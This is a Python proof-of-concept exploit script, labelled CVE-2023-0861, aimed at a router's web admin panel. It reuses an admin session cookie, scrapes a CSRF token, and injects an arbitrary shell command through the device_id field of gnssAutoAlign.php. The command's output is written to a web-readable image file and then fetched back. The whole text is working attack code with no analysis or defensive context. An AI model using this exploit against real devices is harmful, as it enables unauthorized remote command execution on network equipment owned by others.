import re
import requests
import argparse
import urllib.parse


parser = argparse.ArgumentParser(description='CVE-2023-0861 PoC')
parser.add_argument('--url', type=str, required=True, help='URL of the vulnerable router')
parser.add_argument('--phpsessid', type=str, required=True, help='Admin\'s PHP session ID for authentication')
parser.add_argument('--payload', type=str, required=True, help='Command Injection Payload')
args = parser.parse_args()

url = f'{args.url}/admin/gnss.php'
c = {'PHPSESSID':args.phpsessid}
response = requests.get(url,cookies=c)
csrf_token = re.search(r'<input type="hidden" name="csrf-token" value="([^"]+)">', response.text).group(1)
#print(csrf_token)
data = {
'toggleAlignment': 'test',
'device_id': f'1; {args.payload} > /home/www-data/admin/img/nothing.png; 2',
'csrf-token': csrf_token,
}
#print(f'1; {urllib.parse.unquote(args.payload)} > /home/www-data/admin/img/nothing.png 2')
url = f'{args.url}/admin/gnssAutoAlign.php'

response = requests.post(url, data=data,cookies=c)

if response.status_code == 200:
    results = requests.get(f'{args.url}/admin/img/nothing.png',cookies=c)
    #print('done!')
    print(results.content.decode())